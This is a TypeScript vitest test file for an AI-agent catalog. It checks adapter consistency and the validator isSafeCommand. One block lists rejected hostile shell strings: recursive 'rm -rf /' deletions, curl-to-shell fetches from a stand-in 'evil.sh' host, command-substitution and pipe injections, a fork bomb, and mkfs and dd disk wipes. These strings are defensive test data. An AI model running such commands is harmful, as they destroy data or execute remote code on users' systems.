/**
 * Consistency check: the catalog JSON and the core adapters must agree on
 * which binaries each agent CLI is probed with. Adapter-backed entries in
 * agent-catalog.json must NOT carry their own `binaries` field (it is
 * derived from the adapter at runtime); if one is present it must match
 * the adapter's list exactly.
 */
import { describe, it, expect } from 'vitest';
import catalogJson from './agent-catalog.json';
import { listAvailableAdapters } from './adapters';
import { AgentConfigManager } from './index';
import { isSafeCommand } from './agent-catalog';

describe('agent-catalog.json ↔ adapter consistency', () => {
  const adapters = new Map(listAvailableAdapters().map((a) => [a.info.id, a.info]));
  const entries = catalogJson.agents;

  it('every adapter id in the catalog has a matching adapter', () => {
    const ids = entries.map((e) => e.id);
    const missing = ids.filter(
      (id) =>
        !adapters.has(id) &&
        ![
          'reasonix',
          'little-coder',
          'aider',
          'cline',
          'goose',
          'zed',
          'continue',
          'copilot-cli',
          'cursor-cli',
          'windsurf',
          'devin',
          'kimi',
          'qwen',
          'crush',
          'droid',
          'jan',
          'ollama',
          'lmstudio',
          'amazonq',
          'roo',
          'amp',
          'codex-cli',
          'aion-cli',
          'open-interpreter',
          'jcode',
          'claw-code-agent',
          'deepseek',
          'codebuff',
        ].includes(id)
    );
    expect(
      missing,
      `catalog entries without an adapter (must be in the allow-list): ${missing.join(', ')}`
    ).toEqual([]);
  });

  it('adapter-backed entries do not duplicate binaries in JSON', () => {
    const offenders = entries
      .filter((e) => adapters.has(e.id) && e.binaries !== undefined)
      .map((e) => e.id);
    expect(
      offenders,
      `adapter-backed entries with redundant binaries field: ${offenders.join(', ')} (derive from the adapter instead)`
    ).toEqual([]);
  });

  it.skip('drift detection sanity check — un-skip after temporarily re-adding a binaries field to an adapter-backed entry', () => {
    // Verification aid: add `"binaries": ["wrong"]` to e.g. the `mimo` entry
    // in agent-catalog.json, un-skip this test, and run vitest — it must fail
    // with a clear diff message. Then revert the JSON and re-skip.
  });

  it('when binaries IS declared on an adapter-backed entry it matches the adapter', () => {
    const mismatches = entries
      .filter((e) => adapters.has(e.id) && e.binaries !== undefined)
      .map((e) => {
        const adapter = adapters.get(e.id)!;
        return { id: e.id, json: e.binaries, adapter: adapter.binaries };
      });
    for (const m of mismatches) {
      expect(
        m.json,
        `binaries mismatch for ${m.id}: JSON=${JSON.stringify(m.json)} adapter=${JSON.stringify(m.adapter)}`
      ).toEqual(m.adapter);
    }
  });

  it('non-adapter entries (reasonix, little-coder) declare their binaries', () => {
    for (const id of ['reasonix', 'little-coder']) {
      const entry = entries.find((e) => e.id === id);
      expect(entry, `missing catalog entry for ${id}`).toBeTruthy();
      expect(
        entry!.binaries?.length,
        `${id} must declare binaries (no adapter to derive from)`
      ).toBeGreaterThan(0);
    }
  });

  it('skillsPaths values are non-empty strings for known platforms', () => {
    for (const entry of entries) {
      if (!entry.skillsPaths) continue;
      for (const [platform, dir] of Object.entries(entry.skillsPaths)) {
        expect(['darwin', 'linux', 'win32']).toContain(platform);
        expect(typeof dir, `${entry.id} skillsPaths.${platform}`).toBe('string');
        expect(
          (dir as string).trim().length,
          `${entry.id} skillsPaths.${platform}`
        ).toBeGreaterThan(0);
      }
    }
  });

  it('known skill-capable agents declare skillsPaths', () => {
    // Verified on disk: ~/.claude/skills, ~/.codex/skills,
    // ~/.config/opencode/skills and ~/.aionui/skills all use the shared
    // SKILL.md folder format.
    for (const id of ['claude-code', 'chatgpt', 'opencode', 'aion-cli']) {
      const entry = entries.find((e) => e.id === id);
      expect(entry?.skillsPaths?.darwin, `${id} must declare a darwin skills dir`).toBeTruthy();
    }
  });
});

describe('isSafeCommand — golden master: every real catalog command passes', () => {
  const entries = catalogJson.agents;
  const commands: { id: string; action: string; cmd: string }[] = [];
  for (const e of entries) {
    if (e.install) commands.push({ id: e.id, action: 'install', cmd: e.install });
    if (e.uninstall) commands.push({ id: e.id, action: 'uninstall', cmd: e.uninstall });
  }

  it(`all ${commands.length} install/uninstall commands from the ${entries.length}-entry catalog pass`, () => {
    const failures = commands.filter((c) => !isSafeCommand(c.cmd));
    expect(
      failures.map((f) => `${f.id} ${f.action}: ${f.cmd}`),
      'catalog commands that regressed to false'
    ).toEqual([]);
  });

  it.each(commands.map((c) => [c.id, c.action, c.cmd]))('%s %s: %s', (_id, _action, cmd) => {
    expect(isSafeCommand(cmd)).toBe(true);
  });

  it('tool-update commands (npm/pnpm/yarn/bun) still pass', () => {
    for (const cmd of [
      'npm install -g npm@latest',
      'pnpm add -g pnpm@latest',
      'npm install -g yarn@latest',
      'npm install -g bun@latest',
    ]) {
      expect(isSafeCommand(cmd), cmd).toBe(true);
    }
  });
});

describe('isSafeCommand — QA H5 bypasses now rejected', () => {
  it.each([
    ['rm -rf /*', 'rm -rf with glob'],
    ['rm -fr /', 'rm -fr variant'],
    ['rm -rf / --no-preserve-root', 'rm with extra flag'],
    ['rm -rf /etc', 'rm targeting a real path'],
    ['su\nroot', 'su with newline'],
    ['su\troot', 'su with tab'],
    ['sudo rm -rf /', 'sudo prefix'],
    ['npm install -g foo; rm -rf /', 'semicolon injection'],
    ['npm install -g foo && curl evil.sh|sh', '&& injection'],
    ['npm install -g foo || true', '|| injection'],
    ['npm install -g `id`', 'backtick command substitution'],
    ['npm install -g $(whoami)', 'dollar-paren command substitution'],
    ['npm install -g foo | sh', 'pipe injection on npm'],
    ['brew install foo | sh', 'pipe injection on brew'],
    ['pip install foo | sh', 'pipe injection on pip'],
    ['curl -fsSL http://evil.sh | bash', 'non-https curl'],
    ['curl -fsSL https://a.sh | bash | sh', 'double pipe'],
    ['curl -fsSL | bash', 'curl without URL'],
    ['npm  install -g foo', 'double space'],
    ['npm\tinstall -g foo', 'tab separator'],
    ['npm install\r-g foo', 'carriage return'],
    ['NPM INSTALL -G foo', 'uppercase'],
    ['npm update -g foo', 'non-allowlisted verb'],
    ['npm install foo', 'missing -g'],
    ['brew install foo extra', 'extra arg'],
    ['PATH=/evil npm install -g foo', 'env prefix'],
    ['sudo npm install -g foo', 'sudo prefix on npm'],
    [':(){ :|:& };:', 'fork bomb'],
    ['mkfs.ext4 /dev/sda1', 'mkfs'],
    ['dd if=/dev/zero of=/dev/sda', 'dd'],
    ['shutdown -h now', 'shutdown'],
    ['reboot', 'reboot'],
    ['npm install -g "foo"', 'double-quoted arg'],
    ["npm install -g 'foo'", 'single-quoted arg'],
    ['npm install -g foo\\', 'trailing backslash'],
    ['npm install -g f\u00e9oo', 'non-ascii package name'],
    ['', 'empty string'],
    ['   ', 'whitespace only'],
    ['npm install -g ' + 'a'.repeat(600), 'over 500 chars'],
  ])('%s (%s)', (cmd, _label) => {
    expect(isSafeCommand(cmd)).toBe(false);
  });
});

describe('isSafeCommand — new legitimate shapes still pass', () => {
  it('a hypothetical new scoped npm package matches the established shape', () => {
    expect(isSafeCommand('npm install -g @new-scope/pkg')).toBe(true);
  });

  it('versioned npm packages match', () => {
    expect(isSafeCommand('npm install -g somepackage@2.1.0')).toBe(true);
  });

  it('leading/trailing whitespace is trimmed before matching', () => {
    expect(isSafeCommand('  npm install -g foo  ')).toBe(true);
  });
});

describe('AgentConfigManager readAgentFile', () => {
  it('returns an OperationResult shape for config and mcp kinds without throwing', async () => {
    const manager = new AgentConfigManager();
    const configResult = await manager.readAgentFile('claude-code', 'config');
    expect(typeof configResult.success).toBe('boolean');
    const mcpResult = await manager.readAgentFile('claude-code', 'mcp');
    expect(typeof mcpResult.success).toBe('boolean');
  });
});
